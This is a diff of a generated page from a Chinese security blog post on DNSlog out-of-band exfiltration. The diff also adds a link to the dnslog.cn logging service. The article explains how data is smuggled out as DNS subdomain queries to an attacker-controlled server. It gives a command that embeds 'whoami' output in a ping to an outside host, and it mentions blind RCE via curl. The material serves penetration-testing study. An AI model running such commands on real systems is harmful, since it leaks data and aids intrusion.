@@ -6,15 +6,15 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="DNSlog外带技巧详解一、原理核心DNSlog外带利用DNS协议层级穿透性强的特点，通过构造特殊域名查询将敏感数据外传。数据以子域名形式发送至攻击者控制的DNS服务器，服务器记录查询日志实现数据回传。  WebLog管理  二、基础用法12# 基础命令执行示例ping -c 1 &#96;whoami&#96;.YoungKing.eyes.sh  三、无回显RCE123# 无回显命令执行示例curl http">
+    <meta name="description" content="DNSlog外带技巧详解一、原理核心DNSlog外带利用DNS协议层级穿透性强的特点，通过构造特殊域名查询将敏感数据外传。数据以子域名形式发送至攻击者控制的DNS服务器，服务器记录查询日志实现数据回传。  DNSWebLog管理 DNSLog Platform  二、基础用法12# 基础命令执行示例ping -c 1 &#96;whoami&#96;.YoungKing.eyes.sh  三、无回显RCE123#">
 <meta property="og:type" content="article">
 <meta property="og:title" content="dns外带">
 <meta property="og:url" content="https://youngking-gfy.github.io/2025/04/23/dns%E5%A4%96%E5%B8%A6/index.html">
 <meta property="og:site_name" content="Youngking&#39;s Blog">
-<meta property="og:description" content="DNSlog外带技巧详解一、原理核心DNSlog外带利用DNS协议层级穿透性强的特点，通过构造特殊域名查询将敏感数据外传。数据以子域名形式发送至攻击者控制的DNS服务器，服务器记录查询日志实现数据回传。  WebLog管理  二、基础用法12# 基础命令执行示例ping -c 1 &#96;whoami&#96;.YoungKing.eyes.sh  三、无回显RCE123# 无回显命令执行示例curl http">
+<meta property="og:description" content="DNSlog外带技巧详解一、原理核心DNSlog外带利用DNS协议层级穿透性强的特点，通过构造特殊域名查询将敏感数据外传。数据以子域名形式发送至攻击者控制的DNS服务器，服务器记录查询日志实现数据回传。  DNSWebLog管理 DNSLog Platform  二、基础用法12# 基础命令执行示例ping -c 1 &#96;whoami&#96;.YoungKing.eyes.sh  三、无回显RCE123#">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2025-04-23T12:09:45.000Z">
-<meta property="article:modified_time" content="2025-04-23T12:14:55.133Z">
+<meta property="article:modified_time" content="2025-04-23T12:16:20.722Z">
 <meta property="article:author" content="Y0ungK1ng">
 <meta name="twitter:card" content="summary">
     
@@ -84,6 +84,8 @@
     <br/>
     <span id="actions">
       <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/04/28/pangushi2024/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
         
         
         <li><a class="icon" aria-label="Next post" href="/2025/04/21/pinghang2025group/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
@@ -163,7 +165,8 @@
   <div class="content e-content" itemprop="articleBody">
     <h1 id="DNSlog外带技巧详解"><a href="#DNSlog外带技巧详解" class="headerlink" title="DNSlog外带技巧详解"></a>DNSlog外带技巧详解</h1><h2 id="一、原理核心"><a href="#一、原理核心" class="headerlink" title="一、原理核心"></a>一、原理核心</h2><p>DNSlog外带利用DNS协议层级穿透性强的特点，通过构造特殊域名查询将敏感数据外传。数据以子域名形式发送至攻击者控制的DNS服务器，服务器记录查询日志实现数据回传。</p>
 <ul>
-<li><a target="_blank" rel="noopener" href="https://eyes.sh/web/">WebLog管理</a></li>
+<li><a target="_blank" rel="noopener" href="https://eyes.sh/web/">DNSWebLog管理</a></li>
+<li><a target="_blank" rel="noopener" href="http://www.dnslog.cn/">DNSLog Platform</a></li>
 </ul>
 <h2 id="二、基础用法"><a href="#二、基础用法" class="headerlink" title="二、基础用法"></a>二、基础用法</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 基础命令执行示例</span></span><br><span class="line">ping -c 1 `<span class="built_in">whoami</span>`.YoungKing.eyes.sh</span><br></pre></td></tr></table></figure>
 
